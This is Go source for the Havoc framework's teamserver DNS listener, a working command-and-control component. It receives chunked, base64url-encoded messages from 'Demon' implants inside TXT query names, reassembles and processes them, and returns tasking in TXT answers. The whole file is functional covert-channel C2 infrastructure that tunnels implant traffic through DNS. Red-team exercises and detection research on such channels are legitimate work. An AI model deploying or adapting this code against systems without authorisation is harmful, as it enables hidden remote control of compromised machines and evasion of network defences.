package handlers

import (
	"encoding/base64"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"Havoc/pkg/colors"
	"Havoc/pkg/logger"

	"github.com/miekg/dns"
)

const (
	DNSDefaultBindHost  = "0.0.0.0"
	DNSDefaultBindPort  = 53
	DNSDefaultFrequency = 30
	DNSMinFrequency     = 5
	DNSMaxFrequency     = 300

	// DNSChunkChars is the maximum number of base64url characters a single
	// agent query carries. The value is split into DNS labels by the agent.
	DNSChunkChars = 180

	// DNSMaxChunks bounds the reassembly buffer: 512 * 180 = 92160 encoded
	// characters, roughly 69 KiB of raw transport data.
	DNSMaxChunks = 512

	// DNSTXTStringChars is the maximum length of a single TXT string. A TXT
	// string is length-prefixed with one byte, so it must stay below 255.
	DNSTXTStringChars = 200

	DNSChunkTTL    = 60 * time.Second
	DNSCleanupTick = 30 * time.Second
)

type dnsChunkBuffer struct {
	total    int
	parts    []string
	received int
	updated  time.Time
}

type dnsCachedResponse struct {
	data    string
	expires time.Time
}

type dnsState struct {
	mutex     sync.Mutex
	chunks    map[string]*dnsChunkBuffer
	responses map[string]*dnsCachedResponse
	quit      chan struct{}
	stopOnce  sync.Once
}

func newDNSState() *dnsState {
	return &dnsState{
		chunks:    make(map[string]*dnsChunkBuffer),
		responses: make(map[string]*dnsCachedResponse),
		quit:      make(chan struct{}),
	}
}

func NewConfigDns() *DNS {
	return &DNS{State: newDNSState()}
}

func (d *DNS) logDebug(format string, args ...any) {
	logger.Debug(fmt.Sprintf(format, args...))
}

// normalizeDNSDomain returns the canonical lower-case domain without a
// trailing dot. DNS question names always arrive as FQDNs, so comparing
// against a non-canonical value silently never matches.
func normalizeDNSDomain(domain string) (string, error) {
	domain = strings.TrimSpace(strings.ToLower(domain))
	domain = strings.TrimSuffix(domain, ".")
	if domain == "" {
		return "", fmt.Errorf("dns domain is empty")
	}

	// dns.IsDomainName only enforces length limits; reject characters that
	// cannot appear in a host name and empty labels explicitly.
	if len(domain) > 253 {
		return "", fmt.Errorf("dns domain is too long: %s", domain)
	}
	for _, label := range strings.Split(domain, ".") {
		if label == "" || len(label) > 63 {
			return "", fmt.Errorf("invalid dns label in domain: %s", domain)
		}
		for _, c := range label {
			if !((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_') {
				return "", fmt.Errorf("invalid character %q in dns domain: %s", c, domain)
			}
		}
	}

	return domain, nil
}

// normalizeDNSRecordType only TXT is supported by the current protocol.
func normalizeDNSRecordType(recordType string) (string, error) {
	switch strings.ToUpper(strings.TrimSpace(recordType)) {
	case "", "TXT":
		return "TXT", nil
	default:
		return "", fmt.Errorf("unsupported dns record type %q (only TXT is supported)", recordType)
	}
}

// normalizeDNSEncoding accepts the legacy "base64" spelling but always uses
// the URL-safe alphabet on the wire, because standard base64 contains
// characters that are not valid inside a DNS label.
func normalizeDNSEncoding(encoding string) (string, error) {
	switch strings.ToLower(strings.TrimSpace(encoding)) {
	case "", "base64", "base64url":
		return "base64url", nil
	default:
		return "", fmt.Errorf("unsupported dns encoding %q (only base64url is supported)", encoding)
	}
}

func normalizeDNSFrequency(frequency int) int {
	if frequency <= 0 {
		return DNSDefaultFrequency
	}
	if frequency < DNSMinFrequency {
		return DNSMinFrequency
	}
	if frequency > DNSMaxFrequency {
		return DNSMaxFrequency
	}
	return frequency
}

// Start initializes and starts the DNS listener. The listener is bound
// synchronously so a bind failure is reported to ListenerStart instead of
// leaving a listener registered but not actually listening.
func (d *DNS) Start() error {
	logger.Debug("Setup DNS Server")

	if d.Config.Name == "" || d.Config.Domain == "" {
		return fmt.Errorf("dns listener name/domain not set")
	}

	domain, err := normalizeDNSDomain(d.Config.Domain)
	if err != nil {
		return err
	}
	recordType, err := normalizeDNSRecordType(d.Config.RecordType)
	if err != nil {
		return err
	}
	encoding, err := normalizeDNSEncoding(d.Config.Encoding)
	if err != nil {
		return err
	}

	d.Config.Domain = domain
	d.Config.RecordType = recordType
	d.Config.Encoding = encoding
	d.Config.Frequency = normalizeDNSFrequency(d.Config.Frequency)

	if d.Config.BindHost == "" {
		d.Config.BindHost = DNSDefaultBindHost
	}
	if d.Config.BindPort == 0 {
		d.Config.BindPort = DNSDefaultBindPort
	}
	if d.Config.BindPort < 1 || d.Config.BindPort > 65535 {
		return fmt.Errorf("invalid dns bind port: %d", d.Config.BindPort)
	}
	if d.State == nil {
		d.State = newDNSState()
	}

	addr := net.JoinHostPort(d.Config.BindHost, strconv.Itoa(d.Config.BindPort))

	udpConn, err := net.ListenPacket("udp", addr)
	if err != nil {
		return fmt.Errorf("failed to bind dns udp %s: %w", addr, err)
	}

	tcpListener, err := net.Listen("tcp", addr)
	if err != nil {
		_ = udpConn.Close()
		return fmt.Errorf("failed to bind dns tcp %s: %w", addr, err)
	}

	d.Server = &dns.Server{
		PacketConn: udpConn,
		Handler:    dns.HandlerFunc(d.handleDNSRequest),
	}
	d.TCPServer = &dns.Server{
		Listener: tcpListener,
		Handler:  dns.HandlerFunc(d.handleDNSRequest),
	}
	d.Active = true

	go d.cleanupLoop()

	go func() {
		if err := d.Server.ActivateAndServe(); err != nil {
			d.Active = false
			logger.Error("DNS UDP server stopped: " + err.Error())
		}
	}()

	go func() {
		if err := d.TCPServer.ActivateAndServe(); err != nil {
			d.Active = false
			logger.Error("DNS TCP server stopped: " + err.Error())
		}
	}()

	logger.Info("Started \"" + colors.Green(d.Config.Name) + "\" listener: " + colors.BlueUnderline("dns://"+addr+"#"+d.Config.Domain))

	// Add listener to teamserver.
	pk := d.Teamserver.ListenerAdd("", LISTENER_DNS, d)
	d.Teamserver.EventAppend(pk)
	d.Teamserver.EventBroadcast("", pk)

	return nil
}

// Stop gracefully shuts down both DNS transports.
func (d *DNS) Stop() error {
	if d.State != nil {
		d.State.stopOnce.Do(func() {
			close(d.State.quit)
		})
	}

	var firstErr error
	for _, server := range []*dns.Server{d.Server, d.TCPServer} {
		if server == nil {
			continue
		}
		if err := server.Shutdown(); err != nil && !strings.Contains(err.Error(), "server not started") {
			if firstErr == nil {
				firstErr = err
			}
		}
	}

	d.Active = false
	return firstErr
}

func (d *DNS) cleanupLoop() {
	ticker := time.NewTicker(DNSCleanupTick)
	defer ticker.Stop()

	for {
		select {
		case <-d.State.quit:
			return
		case now := <-ticker.C:
			d.State.mutex.Lock()
			for token, buffer := range d.State.chunks {
				if now.Sub(buffer.updated) > DNSChunkTTL {
					delete(d.State.chunks, token)
				}
			}
			for token, response := range d.State.responses {
				if now.After(response.expires) {
					delete(d.State.responses, token)
				}
			}
			d.State.mutex.Unlock()
		}
	}
}

// handleDNSRequest processes one TXT query. The query name carries one chunk
// of a base64url-encoded Demon transport message:
//
//	<seq>.<total>.<token>.<data-label-1>...<data-label-n>.<domain>
func (d *DNS) handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
	var ExternalIP string
	if host, _, err := net.SplitHostPort(w.RemoteAddr().String()); err == nil {
		ExternalIP = host
	} else {
		ExternalIP = w.RemoteAddr().String()
	}

	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, question := range r.Question {
		if question.Qtype != dns.TypeTXT {
			continue
		}

		seq, total, token, data, ok := d.parseQueryName(question.Name)
		if !ok {
			d.logDebug("ignoring dns query %s", question.Name)
			continue
		}

		response, complete := d.assembleChunks(token, seq, total, data, ExternalIP)
		if complete && response != "" {
			msg.Answer = append(msg.Answer, &dns.TXT{
				Hdr: dns.RR_Header{
					Name:   question.Name,
					Rrtype: dns.TypeTXT,
					Class:  dns.ClassINET,
					Ttl:    5,
				},
				Txt: splitTXTStrings(response),
			})
		}

		// Only one question is expected per query.
		break
	}

	// A UDP answer larger than the client's buffer must set TC so the client
	// retries over TCP. The TCP handler runs the same code path.
	if w.LocalAddr().Network() == "udp" {
		size := dns.MinMsgSize
		if opt := r.IsEdns0(); opt != nil && int(opt.UDPSize()) > size {
			size = int(opt.UDPSize())
		}
		msg.Truncate(size)
	}

	if err := w.WriteMsg(msg); err != nil {
		d.logDebug("failed to write dns response: %v", err)
	}
}

func (d *DNS) parseQueryName(name string) (seq int, total int, token string, data string, ok bool) {
	domain := strings.ToLower(dns.Fqdn(d.Config.Domain))
	qname := dns.Fqdn(name)

	// Compare the suffix case-insensitively, but keep the data labels byte
	// for byte: base64url is case-sensitive.
	if !strings.HasSuffix(strings.ToLower(qname), domain) || len(qname) == len(domain) {
		return 0, 0, "", "", false
	}

	prefix := qname[:len(qname)-len(domain)]
	prefix = strings.TrimSuffix(prefix, ".")
	if prefix == "" {
		return 0, 0, "", "", false
	}

	parts := strings.Split(prefix, ".")
	if len(parts) < 4 {
		return 0, 0, "", "", false
	}

	seq, err := strconv.Atoi(parts[0])
	if err != nil {
		return 0, 0, "", "", false
	}
	total, err = strconv.Atoi(parts[1])
	if err != nil {
		return 0, 0, "", "", false
	}
	token = strings.ToLower(parts[2])

	if total < 1 || total > DNSMaxChunks || seq < 0 || seq >= total {
		return 0, 0, "", "", false
	}
	if len(token) != 8 || !isHex(token) {
		return 0, 0, "", "", false
	}

	data = strings.Join(parts[3:], "")
	if data == "" || len(data) > DNSChunkChars {
		return 0, 0, "", "", false
	}

	return seq, total, token, data, true
}

func isHex(value string) bool {
	for _, c := range value {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
			return false
		}
	}
	return true
}

// assembleChunks stores a chunk and, once all chunks are present, decodes the
// message, processes it through the normal agent request parser, and caches
// the response by token. A retried message carries the same token, so a lost
// final response does not execute the same task twice.
func (d *DNS) assembleChunks(token string, seq int, total int, data string, externalIP string) (string, bool) {
	if d.State == nil {
		return "", false
	}

	now := time.Now()
	d.State.mutex.Lock()
	defer d.State.mutex.Unlock()

	if cached, ok := d.State.responses[token]; ok {
		if now.Before(cached.expires) {
			return cached.data, true
		}
		delete(d.State.responses, token)
	}

	buffer, ok := d.State.chunks[token]
	if !ok || buffer.total != total {
		buffer = &dnsChunkBuffer{
			total: total,
			parts: make([]string, total),
		}
		d.State.chunks[token] = buffer
	}

	if buffer.parts[seq] == "" {
		buffer.received++
	}
	buffer.parts[seq] = data
	buffer.updated = now

	if buffer.received != buffer.total {
		return "", false
	}

	encoded := strings.Join(buffer.parts, "")
	delete(d.State.chunks, token)

	message, err := base64.RawURLEncoding.DecodeString(encoded)
	if err != nil {
		logger.Error("Failed to decode DNS command: " + err.Error())
		return "", false
	}

	response, success := parseAgentRequest(d.Teamserver, message, externalIP)
	if !success {
		logger.Warn("Failed to parse agent request over DNS")
		return "", false
	}

	encodedResponse := base64.RawURLEncoding.EncodeToString(response.Bytes())
	if encodedResponse != "" {
		d.State.responses[token] = &dnsCachedResponse{
			data:    encodedResponse,
			expires: now.Add(time.Duration(d.Config.Frequency) * time.Second),
		}
	}

	return encodedResponse, true
}

func splitTXTStrings(value string) []string {
	if value == "" {
		return nil
	}

	var parts []string
	for len(value) > DNSTXTStringChars {
		parts = append(parts, value[:DNSTXTStringChars])
		value = value[DNSTXTStringChars:]
	}
	if value != "" {
		parts = append(parts, value)
	}

	return parts
}
